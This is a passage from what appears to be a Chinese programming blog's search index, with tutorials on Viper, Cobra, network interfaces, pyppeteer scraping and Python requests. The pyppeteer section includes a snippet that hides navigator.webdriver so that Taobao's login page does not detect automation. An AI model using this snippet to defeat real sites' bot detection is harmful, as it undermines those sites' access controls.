panic(fmt.Errorf(\"Fatal error config file: %s \\n\", err))\n}\n```\n\n\n\n##### 1.3 监视配置文件，重新读取配置数据\n\nViper支持让您的应用程序在运行时拥有读取配置文件的能力。\n需要重新启动服务器以使配置生效的日子已经一去不复返了，由viper驱动的应用程序可以在运行时读取已更新的配置文件，并且不会错过任何节拍。\n只需要调用viper实例的WatchConfig函数，你也可以指定一个回调函数来获得变动的通知。\n\n```go\nviper.WatchConfig()\nviper.OnConfigChange(func(e fsnotify.Event) {\n    fmt.Println(\"Config file changed:\", e.Name)\n})\n```\n\n\n\n##### 1.4 从 io.Reader 中读取配置\n\nViper预先定义了许多配置源，例如文件、环境变量、命令行参数和远程K / V存储系统，但您并未受其约束。\n您也可以实现自己的配置源，并提供给viper。\n\n```go\nviper.SetConfigType(\"yaml\") // or viper.SetConfigType(\"YAML\")\n\n// any approach to require this configuration into your program.\nvar yamlExample = []byte(`\nHacker: true\nname: steve\nhobbies:\n- skateboarding\n- snowboarding\n- go\nclothing:\n  jacket: leather\n  trousers: denim\nage: 35\neyes : brown\nbeard: true\n`)\n\nviper.ReadConfig(bytes.NewBuffer(yamlExample))\nviper.Get(\"name\") // 返回 \"steve\"\n```\n\n\n\n##### 1.5 注册并使用别名\n\n```go\nviper.RegisterAlias(\"loud\", \"Verbose\")\n\nviper.Set(\"verbose\", true) \nviper.Set(\"loud\", true)   // 这两句设置的都是同一个值\n\nviper.GetBool(\"loud\") // true\nviper.GetBool(\"verbose\") // true\n```\n\n\n\n##### 1.6 从环境变量中读取\n\nViper 完全支持环境变量，这是的应用程序可以开箱即用。\n有四个和环境变量有关的方法：\n\n+ AutomaticEnv()\n+ BindEnv(string...) : error\n+ SetEnvPrefix(string)\n+ SetEnvKeyReplacer(string...) *strings.Replacer\n\n注意，环境变量时区分大小写的。\n\nViper提供了一种机制来确保Env变量是唯一的。通过SetEnvPrefix，在从环境变量读取时会添加设置的前缀。BindEnv和AutomaticEnv都会使用到这个前缀。\n\nBindEnv需要一个或两个参数。第一个参数是键名，第二个参数是环境变量的名称。环境变量的名称区分大小写。如果未提供ENV变量名称，则Viper会自动假定该键名称与ENV变量名称匹配，并且ENV变量为全部大写。当您显式提供ENV变量名称时，它不会自动添加前缀。\n\n使用ENV变量时要注意，当关联后，每次访问时都会读取该ENV值。Viper在BindEnv调用时不读取ENV值。\n\nAutomaticEnv与SetEnvPrefix结合将会特别有用。当AutomaticEnv被调用时，任何viper.Get请求都会去获取环境变量。环境变量名为SetEnvPrefix设置的前缀，加上对应名称的大写。\n\nSetEnvKeyReplacer允许你使用一个strings.Replacer对象来将配置名重写为Env名。如果你想在Get()中使用包含-的配置名 ，但希望对应的环境变量名包含_分隔符，就可以使用该方法。使用它的一个例子可以在项目中viper_test.go文件里找到。\n例子：\n\n```go\nSetEnvPrefix(\"spf\") // 将会自动转为大写\nBindEnv(\"id\")\n\nos.Setenv(\"SPF_ID\", \"13\") // 通常通过系统环境变量来设置\n\nid := Get(\"id\") // 13\n```\n\n\n\n##### 1.7 绑定命令行参数\n\nViper支持绑定pflags参数。\n和BindEnv一样，当绑定方法被调用时，该值没有被获取，而是在被访问时获取。这意味着应该尽早进行绑定，甚至是在init()函数中绑定。\n\n利用BindPFlag()方法可以绑定单个flag。例子：\n\n```go\nserverCmd.Flags().Int(\"port\", 1138, \"Port to run Application server on\")\nviper.BindPFlag(\"port\", serverCmd.Flags().Lookup(\"port\"))\n```\n\n\n你也可以绑定已存在的pflag集合 (pflag.FlagSet):\n\n```go\npflag.Int(\"flagname\", 1234, \"help message for flagname\")\n\npflag.Parse()\nviper.BindPFlags(pflag.CommandLine)\n\ni := viper.GetInt(\"flagname\") // 通过viper从pflag中获取值\n```\n\n\n使用pflag并不影响其他库使用标准库中的flag。通过导入，pflag可以接管通过标准库的flag定义的参数。这是通`过调用pflag包中的AddGoFlagSet()方法实现的。例子：\n\n```go\npackage main\n\nimport (\n    \"flag\"\n    \"github.com/spf13/pflag\"\n)\n\nfunc main() {\n\n    // using standard library \"flag\" package\n    flag.Int(\"flagname\", 1234, \"help message for flagname\")\n\n    pflag.CommandLine.AddGoFlagSet(flag.CommandLine)\n    pflag.Parse()\n    viper.BindPFlags(pflag.CommandLine)\n\n    i := viper.GetInt(\"flagname\") // retrieve value from viper\n\n    ...\n}\n```\n\n\n\n##### 1.8 获取值\n\n在Viper中，有一些根据值的类型获取值的方法。存在一下方法：\n\n+ Get(key string) : interface{}\n\n+ GetBool(key string) : bool\n\n+ GetFloat64(key string) : float64\n\n+ GetInt(key string) : int\n\n+ GetString(key string) : string\n\n+ GetStringMap(key string) : map[string]interface{}\n\n+ GetStringMapString(key string) : map[string]string\n\n+ GetStringSlice(key string) : []string\n\n+ GetTime(key string) : time.Time\n\n+ GetDuration(key string) : time.Duration\n\n+ IsSet(key string) : bool\n\n\n如果Get函数未找到值，则返回对应类型的一个零值。可以通过 IsSet() 方法来检测一个健是否存在。例子:\n\n```go\nviper.GetString(\"logfile\") // Setting & Getting 不区分大小写\nif viper.GetBool(\"verbose\") {\n    fmt.Println(\"verbose enabled\")\n}\n```\n\n\n\n##### 1.9 访问嵌套键\n\n访问方法也接受嵌套的键。例如，如果加载了以下JSON文件：\n\n```json\n{\n    \"host\": {\n        \"address\": \"localhost\",\n        \"port\": 5799\n    },\n    \"datastore\": {\n        \"metric\": {\n            \"host\": \"127.0.0.1\",\n            \"port\": 3099\n        },\n        \"warehouse\": {\n            \"host\": \"198.0.0.1\",\n            \"port\": 2112\n        }\n    }\n}\n```\n\n\nViper可以通过.分隔符来访问嵌套的字段：\n\n```go\nGetString(\"datastore.metric.host\") // (returns \"127.0.0.1\")\n```\n\n\n这遵守前面确立的优先规则; 会搜索路径中所有配置，直到找到为止。\n例如，上面的文件，datastore.metric.host和 datastore.metric.port都已经定义（并且可能被覆盖）。如果另外 datastore.metric.protocol的默认值，Viper也会找到它。\n\n但是，如果datastore.metric值被覆盖（通过标志，环境变量，Set方法，...），则所有datastore.metric的子键将会未定义，它们被优先级更高的配置值所“遮蔽”。\n\n最后，如果存在相匹配的嵌套键，则其值将被返回。例如：\n\n```json\n{\n    \"datastore.metric.host\": \"0.0.0.0\",\n    \"host\": {\n        \"address\": \"localhost\",\n        \"port\": 5799\n    },\n    \"datastore\": {\n        \"metric\": {\n            \"host\": \"127.0.0.1\",\n            \"port\": 3099\n        },\n        \"warehouse\": {\n            \"host\": \"198.0.0.1\",\n            \"port\": 2112\n        }\n    }\n}\n\nGetString(\"datastore.metric.host\") // returns \"0.0.0.0\"\n```\n\n\n\n### 3. 参考资料\n\n+ [Golang的配置信息处理框架Viper](https://blog.51cto.com/13599072/2072753)\n+ https://www.jishuwen.com/d/2vNk","tags":["viper"],"categories":["4_golang实战"]},{"title":"golang命令行库cobra的使用","url":"%2Fp%2Fd50935d7.html","content":"\n### 0. 前言\n\nCobra(眼镜蛇)是一个库，其提供简单的接口来创建强大现代的CLI接口，类似于git或者go工具。同时，它也是一个应用，用来生成个人应用框架，从而开发以Cobra为基础的应用。Docker源码中使用了Cobra。\n\nCobra基于三个基本概念`commands`,`arguments`和`flags`。其中commands代表行为，arguments代表数值，flags代表对行为的改变。\n\n基本模型如下：\n\n```bash\nAPPNAME COMMAND ARG --FLAG\n\n# hugo是cmmands server是commands，port是flag\nhugo server --port=1313\n\n# clone是commands，URL是arguments，brae是flags\ngit clone URL --bare\n```\n\n\n<!-- more -->\n\n\n\n### 1. 安装和使用\n\n安装:\n\n```bash\ngo get -u github.com/spf13/cobra/cobra\n```\n\n\n\n你的项目结构可能如下:\n\n```bash\n  ▾ appName/\n    ▾ cmd/\n        root.go\n        version.go\n        commands.go\n      main.go\n```\n\n\n\n##### 1.1 main.go\n\nIn a Cobra app, typically the main.go file is very bare(裸露). It serves one purpose: initializing Cobra.\n\n```go\npackage main\n\nimport (\n  \"appName/cmd\"\n)\n\nfunc main() {\n  cmd.Execute()\n}\n```\n\n\n\n##### 1.2 rootcmd\n\n```go\nvar rootCmd = &cobra.Command{\n  Use:   \"hugo\",\n  Short: \"Hugo is a very fast static site generator\",\n  Long: `A Fast and Flexible Static Site Generator built with\n                love by spf13 and friends in Go.\n                Complete documentation is available at http://hugo.spf13.com`,\n  Run: func(cmd *cobra.Command, args []string) {\n    // Do Stuff Here\n  },\n}\n\nfunc Execute() {\n  if err := rootCmd.Execute(); err != nil {\n    fmt.Println(err)\n    os.Exit(1)\n  }\n}\n```\n\n\n\n##### 1.3 additional commands\n\n```go\npackage cmd\n\nimport (\n  \"fmt\"\n\n  \"github.com/spf13/cobra\"\n)\n\nfunc init() {\n  rootCmd.AddCommand(versionCmd)\n}\n\nvar versionCmd = &cobra.Command{\n  Use:   \"version\",\n  Short: \"Print the version number of Hugo\",\n  Long:  `All software has versions. This is Hugo's`,\n  Run: func(cmd *cobra.Command, args []string) {\n    fmt.Println(\"Hugo Static Site Generator v0.9 -- HEAD\")\n  },\n}\n```\n\n\n\n可以简单执行下面命令查看效果\n\n```bash\ngo run main.go help\ngo run main.go version\n```\n\n\n\n### 3. cobra 生成器\n\n在文件夹github.com/spf13/cobra/cobra下使用go install, 生成 cobra命令\n\n命令`cobra init [yourApp]`将会创建初始化应用，yourApp 是你的项目名称。它会在你的 GOPATH 目录下面生成项目。最新的操作方式:\n\n```bash\ncd /Users/liuwei/golang/src/github.com/unix2dos/golangTest\ncobra init --pkg-name=github.com/unix2dos/golangTest yourApp\n```\n\n\n\n接下来我们用`cobra add`来添加一些子命令。在你项目的目录下，运行下面这些命令：\n\n```bash\ncobra add serve\ncobra add config\ncobra add create -p 'configCmd'\n```\n\n这样以后，你就可以运行上面那些 app serve 之类的命令了。项目目录如下：\n\n```bash\n▾ app/\n  ▾ cmd/\n      serve.go\n      config.go\n      create.go\n    main.go\n```\n\n\n\n### 4. 使用Flags\n\ncobra 有两种 flag，一个是全局变量，一个是局部变量。全局什么意思呢，就是所以子命令都可以用。局部的只有自己能用。先看全局的：\n\n```go\nRootCmd.PersistentFlags().StringVar(&cfgFile, \"config\", \"\", \"config file (default is $HOME/.cobra_exp1.yaml)\")\n```\n\n在看局部的：\n\n```go\nRootCmd.Flags().BoolP(\"toggle\", \"t\", false, \"Help message for toggle\")\n```\n\n区别就在 RootCmd 后面的是 Flags 还是 PersistentFlags。\n\n\n\n### 5. 参考资料\n\n+ [Golang之使用Cobra](https://o-my-chenjian.com/2017/09/20/Using-Cobra-With-Golang/)\n\n+ https://www.kancloud.cn/liupengjie/go/1010466","tags":["cobra"],"categories":["4_golang实战"]},{"title":"网络接口介绍","url":"%2Fp%2F9dad86f4.html","content":"\n### 1. 网络接口介绍\n\n##### 1.1 网络接口的命名\n\n网络接口并不存在一定的命名规范，但网络接口名字的定义一般都是要有意义的。例如：\n\n+ eth0: ethernet的简写，一般用于以太网接口。\n\n+ wifi0:wifi是无线局域网，因此wifi0一般指无线网络接口。\n\n+ ath0: Atheros的简写，一般指Atheros芯片所包含的无线网络接口。\n\n+ lo: local的简写，一般指本地环回接口。\n\n<!-- more -->\n\n##### 1.2 网络接口如何工作\n\n网络接口是用来发送和接受数据包的基本设备。\n\n系统中的所有网络接口组成一个链状结构，应用层程序使用时按名称调用。\n\n每个网络接口在linux系统中对应于一个struct net_device结构体，包含name,mac,mask,mtu…信息。\n\n每个硬件网卡(一个MAC)对应一个网络接口，其工作完全由相应的驱动程序控制。\n\n##### 1.3 虚拟网络接口\n\n虚拟网络接口的应用范围非常广泛。最着名的当属“lo”了，基本上每个linux系统都有这个接口。\n\n虚拟网络接口并不真实地从外界接收和发送数据包，而是在系统内部接收和发送数据包，因此虚拟网络接口不需要驱动程序。\n\n虚拟网络接口和真实存在的网络接口在使用上是一致的。\n\n##### 1.4 网络接口的创建\n\n硬件网卡的网络接口由驱动程序创建。而虚拟的网络接口由系统创建或通过应用层程序创建。\n\n驱动中创建网络接口的函数是：`register_netdev(struct net_device *)`或者`register_netdevice(struct net_device *)`。\n\n这两个函数的区别是：register_netdev(…)会自动生成以”eth”作为打头名称的接口，而register_netdevice(…)需要提前指定接口名称.事实上，register_netdev(…)也是通过调用register_netdevice(…)实现的。\n\n\n\n### 2. mac的网络接口\n\n- lo0 = loopback > 回环接口或者 本地主机(localhost)\n- gif0 = Software Network Interface > 通用 IP-in-IP隧道(RFC2893)\n- stf0 = 6to4 tunnel interface > 6to4连接(RFC3056)\n- en0 = Ethernet 0 > 以太网或802.11接口\n- fw0 = Firewire > IP over FireWire(IEEE-1394), macOS特有\n- en1 = Ethernet 1 > \n- vmnet8 = Virtual Interface > 虚拟网卡8\n- vmnet1 = Virtual Interface > 虚拟网卡1\n- p2p Point-to-Point 协议\n- awdl airdrop peer to peer(一种mesh network), apple airdrop设备特有\n- bridge 第2层桥接\n- vlan 虚拟局域网络\n\n在iOS设备(支持cellular)上还能看到\n\n+ pdp_ip 蜂窝数据连接\n\n那en0 en1 en2 en3 en4 怎么这么多？？？ 运行一下命令： \n\n```bash\nnetworksetup -listallhardwareports\n\nHardware Port: Wi-Fi\nDevice: en0\nEthernet Address: c4:b3:01:bd:ad:1d\n\nHardware Port: Bluetooth PAN\nDevice: en3\nEthernet Address: c4:b3:01:bd:ad:1e\n\nHardware Port: Thunderbolt 1\nDevice: en1\nEthernet Address: 4a:00:07:4d:b2:b0\n\nHardware Port: Thunderbolt 2\nDevice: en2\nEthernet Address: 4a:00:07:4d:b2:b1\n\nHardware Port: Thunderbolt Bridge\nDevice: bridge0\nEthernet Address: 4a:00:07:4d:b2:b0\n```\n\n原来是Wi-Fi，蓝牙，thunderbolt…\n\n\n\n### 3. ifconfig 命令\n\n```bash\n[root@localhost ~]# ifconfig\neth0      Link encap:Ethernet  HWaddr 00:50:56:BF:26:20  \n          inet addr:192.168.120.204  Bcast:192.168.120.255  Mask:255.255.255.0\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:8700857 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:31533 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000 \n          RX bytes:596390239 (568.7 MiB)  TX bytes:2886956 (2.7 MiB)\n\nlo        Link encap:Local Loopback  \n          inet addr:127.0.0.1  Mask:255.0.0.0\n          UP LOOPBACK RUNNING  MTU:16436  Metric:1\n          RX packets:68 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:68 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:0 \n          RX bytes:2856 (2.7 KiB)  TX bytes:2856 (2.7 KiB)\n```\n\n第一行：连接类型：Ethernet（以太网）HWaddr（硬件mac地址）\n\n第二行：网卡的IP地址、子网、掩码\n\n第三行：UP（代表网卡开启状态）RUNNING（代表网卡的网线被接上）MULTICAST（支持组播）MTU:1500（最大传输单元）：1500字节\n\n第四、五行：接收、发送数据包情况统计\n\n第七行：接收、发送数据字节数统计信息。\n\n\n\n其他说明:\n\n+ eth0 表示第一块网卡， 其中 HWaddr 表示网卡的物理地址，可以看到目前这个网卡的物理地址(MAC地址）是 00:50:56:BF:26:20\n\n+ inet addr 用来表示网卡的IP地址，此网卡的 IP地址是 192.168.120.204，广播地址， Bcast:192.168.120.255，掩码地址Mask:255.255.255.0 \n\n+ lo 是表示主机的回坏地址，这个一般是用来测试一个网络程序，但又不想让局域网或外网的用户能够查看，只能在此台主机上运行和查看所用的网络接口。比如把 HTTPD服务器的指定到回坏地址，在浏览器输入 127.0.0.1 就能看到你所架WEB网站了。但只是您能看得到，局域网的其它主机或用户无从知道。\n\n\n\n### 4. 参考资料\n\n+ [Linux中的lo回环接口详细介绍](https://blog.csdn.net/huguohu2006/article/details/7261106)\n\n+ [ifconfig命令](http://www.voidcn.com/article/p-ehcsampr-bmr.html)\n\n+ [ifconfig output in Mac OS X?](https://superuser.com/questions/267660/can-someone-please-explain-ifconfig-output-in-mac-os-x)\n","tags":["网络接口"],"categories":["计算机基础"]},{"title":"python爬虫利器pyppeteer的使用","url":"%2Fp%2F6b1ba1b4.html","content":"\n\n\n### 0. 前言\n\nChrome59(linux、macos)、 Chrome60(windows)之后，Chrome自带[headless(无界面)模式](https://developers.google.com/web/updates/2017/04/headless-chrome)很方便做自动化测试或者爬虫。但是如何和headless模式的Chrome交互则是一个问题。通过启动Chrome时的命令行参数仅能实现简易的启动时初始化操作。Selenium、Webdriver等是一种解决方案，但是往往依赖众多，不够扁平。\n\n\n\npuppeteer是谷歌官方出品的一个通过DevTools协议控制headless Chrome的Node库。可以通过puppeteer的提供的api直接控制Chrome模拟大部分用户操作来进行UI Test或者作为爬虫访问页面来收集数据。\n\n\n\npyperteer是puppeteer的Python实现，相比于selenium具有异步加载、速度快、具备有界面/无界面模式、伪装性更强不易被识别为机器人同时可以伪装手机平板等终端；但是也有一些缺点，如接口不易理解、语义晦涩；\n\n<!-- more -->\n\n\n\n### 1. pyppeteer使用\n\n```bash\npip3 install pyppeteer\n```\n\n\n\n\n\n##### 1.1 无头模式\n\n```python\nbrowser = await launch({'headless': False, 'args': ['--no-sandbox']})\n```\n\nheadless=True, 不弹出浏览器, 测试阶段可以设置为 False 观测\n\n##### 1.2 page方法\n\n```bash\npage.click 点击\npage.type 输入\npage.select 下拉框\n\n\npage.click('.rfm input[name=\"cookietime\"]')\n```\n\n对于 page方法内的选择元素语法请参考:  https://www.w3schools.com/cssref/css_selectors.asp\n\n\n\n### 2. pyppeteer  linux运行问题\n\n##### 2.1 centos无法运行pyppeteer\n\n```\nyum -y install libX11 libXcomposite libXcursor libXdamage libXext libXi libXtst cups-libs libXScrnSaver libXrandr alsa-lib pango atk at-spi2-atk gtk3 \n```\n\n\n\n##### 2.2 Bad NaCl helper startup ack\n\n```\nERROR:nacl_fork_delegate_linux.cc(314)] Bad NaCl helper startup ack (0 bytes)\\n\\n(chrome:24935)\n```\n\n使用无头模式\n\n\n\n##### 2.3 Navigation Timeout Exceeded: 30000 ms exceeded\n\n```\nawait page.goto(\"https://www.baidu.com\", timeout=0)\n```\n\n+ 加上timeout\n\n+ 检测封禁 ip\n\n\n\n\n\n### 3. pyppeteer 问题解决方案\n\n##### 3.1 抓取js 渲染后的数据\n\n使用 requests 是无法正常抓取到相关数据的。因为什么？因为这个页面是 JavaScript 渲染而成的，我们所看到的内容都是网页加载后又执行了 JavaScript 之后才呈现出来的，因此这些条目数据并不存在于原始 HTML 代码中，而 requests 仅仅抓取的是原始 HTML 代码。\n\n好的，所以遇到这种类型的网站我们应该怎么办呢？\n\n其实答案有很多：\n\n- 分析网页源代码数据，如果数据是隐藏在 HTML 中的其他地方，以 JavaScript 变量的形式存在，直接提取就好了。\n- 分析 Ajax，很多数据可能是经过 Ajax 请求时候获取的，所以可以分析其接口。\n- 模拟 JavaScript 渲染过程，直接抓取渲染后的结果。\n\n\n\n而 Pyppeteer 和 Selenium 就是用的第三种方法，下面我们再用 Pyppeteer 来试试，如果用 Pyppeteer 实现如上页面的抓取的话，代码就可以写为如下形式：\n\n```python\nimport asyncio\nfrom pyppeteer import launch\nfrom pyquery import PyQuery as pq\n\nasync def main():\n    browser = await launch()\n    page = await browser.newPage()\n    await page.goto('http://quotes.toscrape.com/js/')\n    doc = pq(await page.content())\n    print('Quotes:', doc('.quote').length)\n    await browser.close()\n\nasyncio.get_event_loop().run_until_complete(main())\n```\n\n\n\n##### 3.2 webdriver 检测问题\n\n有些网站还是会检测到是 webdriver 吧，比如淘宝检测到是 webdriver 就会禁止登录了\n\n其实淘宝主要通过 window.navigator.webdriver 来对 webdriver 进行检测，所以我们只需要使用 JavaScript 将它设置为 false 即可，代码如下：\n\n```python\nimport asyncio\nfrom pyppeteer import launch\n\nasync def main():\n    browser = await launch(headless=False, args=['--disable-infobars'])\n    page = await browser.newPage()\n    await page.goto('https://login.taobao.com/member/login.jhtml?redirectURL=https://www.taobao.com/')\n    await page.evaluate(\n        '''() =>{ Object.defineProperties(navigator,{ webdriver:{ get: () => false } }) }''')\n    await asyncio.sleep(100)\n\nasyncio.get_event_loop().run_until_complete(main())\n```\n\n\n\n##### 3.3 保持用户记录\n\n很多朋友在每次启动 Selenium 或 Pyppeteer 的时候总是是一个全新的浏览器，那就是没有设置用户目录，如果设置了它，每次打开就不再是一个全新的浏览器了，它可以恢复之前的历史记录，也可以恢复很多网站的登录信息。那么这个怎么来做呢？很简单，在启动的时候设置 userDataDir 就好了，示例如下：\n\n```python\nimport asyncio\nfrom pyppeteer import launch\n\nasync def main():\n    browser = await launch(headless=False, userDataDir='./userdata', args=['--disable-infobars'])\n    page = await browser.newPage()\n    await page.goto('https://www.taobao.com')\n    await asyncio.sleep(100)\n\nasyncio.get_event_loop().run_until_complete(main())\n```\n\n\n\n### 4. 参考资料\n\n+ https://github.com/miyakogi/pyppeteer\n+ [Python爬虫入门教程 24-100 微医挂号网医生数据抓取](https://juejin.im/post/5c35944b6fb9a049de6d8dd2)\n+ [Python中与selenium齐名的pyppeteer库](https://zhuanlan.zhihu.com/p/63634783)\n+ [pyppeteer使用遇到的bug及解决方法](https://www.sanfenzui.com/pyppeteer-bug-collection.html)\n+ https://juejin.im/post/59e5a86c51882578bf185dba","tags":["爬虫"],"categories":["python"]},{"title":"python爬虫基础","url":"%2Fp%2F2412099c.html","content":"\n\n\n# 0. 前言\n\n网络爬虫（又被称为网页蜘蛛，网络机器人，在FOAF社区中间，更经常的称为网页追逐者），是一种按照一定的规则，自动的抓取万维网信息的程序或者脚本。\n\n我认为一次爬虫的过程, 就是网络请求到数据后, 处理数据, 然后发送数据的过程.\n\n<!-- more -->\n\n# 1. 网络请求(requests)\n\n python网络请求主要有 `urllib` 和 `requests`  库, 墙裂推荐`requests`\n\n```python\nimport requests\n\nurl = 'http://www.baidu.com'\nresponse = requests.get(url)\nhtml = response.text\nprint(html)\n\n\nimport requests\n\nurl = \"http://docs.python-requests.org/zh_CN/latest/_static/requests-sidebar.png\"\nresponse = requests.get(url)\nwith open('image.png','wb') as f:\n  f.write(response.content)\n```\n\n\n\n# 2. 数据提取 (pyquery)\n\n一般我们请求的数据主要分以下几类:\n\n+ html, xml\n+ json\n+ 字符串\n\n对于 html, xml 我们要使用相关的库进行处理, json直接反序列化处理, 字符串可能需要字符串匹配 和 正则表达式 处理\n\n\n\n> 对html/xml 处理的库主要有以下几种:\n\n### 2.1 beautifulsoup\n\n```bash\npip install beautifulsoup4\n```\n\nbeautiful Soup将复杂HTML文档转换成一个复杂的树形结构,每个节点都是Python对象\n\n### 2.2 lxml\n\nlxml 使用的是 xpath 技术\n\n```bash\npip install lxml\n```\n\n### 2.3  lxml, beautifulSoup 对比\n\nBeautifulSoup是一个库，而XPath是一种技术，python中最常用的XPath库是lxml，因此，这里就拿lxml来和BeautifulSoup做比较吧.\n\n+ 性能 lxml >> BeautifulSoup\n\nBeautifulSoup和lxml的原理不一样，BeautifulSoup是基于DOM的，会载入整个文档，解析整个DOM树，因此时间和内存开销都会大很多。而lxml只会局部遍历，另外lxml是用c写的，而BeautifulSoup是用python写的，因此性能方面自然会差很多。\n\n+ 易用性 BeautifulSoup >> lxml\n\nBeautifulSoup用起来比较简单，API非常人性化，支持css选择器。lxml的XPath写起来麻烦，开发效率不如BeautifulSoup。\n\n```\ntitle = soup.select('.content div.title h3')\n```\n\n同样的代码用Xpath写起来会很麻烦\n\n```\ntitle = tree.xpath(\"//*[@class='content']/div[@class='content']/h3\")\n```\n\n### 2.4. pyquery \n\npyquery 可让你用 jQuery 的语法来对 html/xml 进行操作。这和 jQuery 十分类似。这个库不是（至少还不是）一个可以和 JavaScript交互的代码库，它只是非常像 jQuery API 而已。\n\n```bash\npip install pyquery\n```\n\n我们可以看下面这个例子:\n\n```python\n    def parse_html(self,content):\n        doc = pq(content)\n        items = doc(\".dt\").items()\n        for item in items:\n            title = item.find(\"center\").text()\n            for i in item.find(\"th\").items():\n                category = i.find(\"a\").eq(0).text()\n                neirong = i.find(\"a\").eq(1).text()\n                url = i.find(\"a\").eq(1).attr('href')\n\n                one_data = {\n                    \"category\": category,\n                    \"context\": neirong,\n                    \"url\": url,\n                }\n                print(one_data)\n```\n\n\n\n# 3. 无头浏览器(pyppeteer)\n\n以前写爬虫，遇到需要登录的页面，一般都是通过chrome的检查元素，查看登录需要的参数和加密方法，如果网站的加密非常复杂，例如登录qq的，就会很蛋疼。\n\n现在有了无头浏览器，再也不需要考虑登录的参数和加密了，用无头浏览器打开页面，通过JS或JQuery语句，填入账号和密码，然后点击登陆，然后把Cookies保存下来，就可以模拟登陆了。\n\n\n\n### 3.1 PhantomJS(暂停开发)\n\n```\nserWarning: Selenium support for PhantomJS has been deprecated, please use headless versions of Chrome or Firefox instead\n\n新版本的Selenium不再支持PhantomJS了，请使用Chrome或Firefox的无头版本来替代。\n```\n\n\n\nPhantomJS是一个无界面的,可脚本编程的WebKit浏览器引擎。它原生支持多种web 标准：DOM 操作，CSS选择器，JSON，Canvas 以及SVG。因此可以比浏览器更加快速的解析处理js加载。\n\n\n\n有时，我们需要浏览器处理网页，但并不需要浏览，比如生成网页的截图、抓取网页数据等操作。[PhantomJS](http://phantomjs.org/)的功能，就是提供一个浏览器环境的命令行接口，你可以把它看作一个“虚拟浏览器”，除了不能浏览，其他与正常浏览器一样。它的内核是WebKit引擎，不提供图形界面，只能在命令行下使用，我们可以用它完成一些特殊的用途。\n\n\n\n下载: https://phantomjs.org/download.html , 然后把二进制放到一个目录下, 增加个$PATH 指定即可\n\n```\nphantomjs -v\n```\n\n\n\n### 3.2. selenium\n\nselenium 是什么？一句话，自动化测试工具。它支持各种浏览器，包括 Chrome，Safari，Firefox 等主流界面式浏览器。换句话说叫 Selenium 支持这些浏览器驱动。话说回来，PhantomJS不也是一个浏览器吗，那么 Selenium 支持不？答案是肯定的，这样二者便可以实现无缝对接了。有人问，为什么不直接用浏览器而用一个没界面的 PhantomJS 呢？答案是：效率高！\n\n\n\n嗯，所以呢？安装一下 Python 的 Selenium 库，再安装好 PhantomJS，不就可以实现 Python＋Selenium＋PhantomJS 的无缝对接了嘛！Selenium 用来驱动浏览器, PhantomJS 用来渲染解析界面, Python 进行后期的处理，完美的三剑客！\n\n\n\n```\npip install selenium\n```\n\n\n\n然后我们看一个例子, 通过 selenium 驱动 [chrome driver](https://sites.google.com/a/chromium.org/chromedriver/downloads)打开百度搜索关键词\n\n```python\nfrom selenium import webdriver\nfrom selenium.webdriver.common.keys import Keys\n\nbrowser = webdriver.Chrome(executable_path=\"./drivers/chromedriver\")\nbrowser.get('http://www.baidu.com/')\n\nkw = browser.find_element_by_id(\"kw\")\nkw.send_keys(\"Selenium\", Keys.RETURN)\n```\n\n\n\n### 3.3. pyppeteer \n\npyppeteer 是依赖于 chromium 这个浏览器来运行的,  并且是基于 python 的新特性 async 实现的，所以它的一些执行也支持异步操作，效率相对于 selenium 来说也提高了。\n\n```bash\npip3 install pyppeteer\n```\n\n我们可以来看下面这个例子, 是打开baidu 后截图\n\n```python\nimport asyncio\nfrom pyppeteer import launch\n\nasync def main():\n    browser = await launch()\n    page = await browser.newPage()\n    await page.goto('http://www.baidu.com')\n    await page.screenshot({'path': 'example.png'})\n    await browser.close()\n\nasyncio.get_event_loop().run_until_complete(main())\n```\n\n\n\n# 4. 爬虫框架\n\n### 4.1 pyspider\n\npyspider上手更简单，操作更加简便，因为它增加了 WEB 界面，写爬虫迅速，集成了phantomjs，可以用来抓取js渲染的页面。\n\n```bash\npip install pyspider\n```\n\n安装成功后在 [python 3.7 下运行就报错](https://github.com/binux/pyspider/issues/817), 看来作者很久没维护了\n\n\n\n\n### 4.2 scrapy\n\n```bash\npip install Scrapy\n```\n\nscrapy自定义程度高，比 PySpider更底层一些，适合学习研究，需要学习的相关知识多，不过自己拿来研究分布式和多线程等等是非常合适的。\n\n\n\n# 5. 参考资料\n\n+ https://cuiqingcai.com/1052.html\n+ https://cuiqingcai.com/6942.html\n+ https://github.com/Kr1s77/Python-crawler-tutorial-starts-from-zero","tags":["爬虫"],"categories":["爬虫"]},{"title":"python_requests的使用","url":"%2Fp%2F4a761254.html","content":"\n\n\nrequest是一个简答优雅的python HTTP库，相较于python标准库中的urllib和urllib2的库，requests更加的便于理解和使用.\n\n\n\n### 1. 安装 requests\n\n```bash\npip install requests\n```\n\n<!-- more -->\n\n### 2. requests包的使用\n\n##### get\n\n```\n>>> payload = {'key1': 'value1', 'key2': 'value2'}\n>>> r = requests.get('https://httpbin.org/get', params=payload)\n\n>>> print(r.url)\nhttps://httpbin.org/get?key2=value2&key1=value1\n```\n\n\n\n##### post\n\n```python\nimport requests\nimport json\n\nheaders = {'content-type': 'application/json'}\nurl = 'http://192.168.3.45:8080/api/v2/event/log'\n\ndata = {\"eventType\": \"AAS_PORTAL_START\", \"data\": {\"uid\": \"hfe3hf45huf33545\", \"aid\": \"1\", \"vid\": \"1\"}}\nparams = {'sessionKey': '9ebbd0b25760557393a43064a92bae539d962103', 'format': 'xml', 'platformId': 1}\n\nrequests.post(url, params=params, data=json.dumps(data), headers=headers, timeout=2)\n```\n\n\n\n##### parse \n\n```python\nimport requests\nrequests.get(url).json()\n```\n\n\n\n\n\n### 3. 参考资料:\n\n+ https://2.python-requests.org//zh_CN/latest/user/quickstart.html","tags":["requests"],"categories":["python"]},{"title":"python基础实践","url":"%2Fp%2Fd319c20d.html","content":"\n### 1. 模块\n\nPython 模块(Module)，是一个 Python 文件，以 .py 结尾，包含了 Python 对象定义和Python语句。\n\n```python\nfrom pkg.func import hello\n# pkg 是模块名字,就是目录名字\n# pkg.func 是 pkg 目录下的 func 文件\n# hello 是 func 文件的 hello函数\n\n\nfrom pkg.topic import Topic\n# Topic 是 topic 文件的 类\n```\n\n\n\n+ `__init__.py` ,如果目录中存在该文件，该目录就会被识别为 module package 。\n+ `__init__.py` 